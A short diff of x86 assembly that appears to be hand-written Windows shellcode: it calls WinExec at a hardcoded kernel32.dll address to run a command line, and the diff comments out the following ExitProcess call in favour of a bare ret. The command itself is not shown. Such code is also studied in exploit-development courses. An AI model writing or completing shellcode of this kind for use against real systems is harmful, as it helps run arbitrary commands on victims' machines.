@@ -30,9 +30,11 @@ _start:
 	push eax		        ; lpCmdLine *ptr to stack on pos 1 (LIFO)
 	mov ebx, 0x76d1f52e		; move and call WinExec() function on current Address in Kernel32.dll
 	call ebx				;
-				
+	
 	; void ExitProcess([in] UINT uExitCode);
-	xor eax, eax		    ; Zero out eax
-	push eax		        ; push NULL
-	mov eax, 0x76cebe8a		; move and call ExitProcess() function on current Address in Kernel32.dll
-	jmp eax			        ; execute the ExitProcess() function
+;	xor eax, eax		    ; Zero out eax
+;	push eax		        ; push NULL
+;	mov eax, 0x76cebe8a		; move and call ExitProcess() function on current Address in Kernel32.dll
+;	jmp eax			        ; execute the ExitProcess() function
+	ret
+END
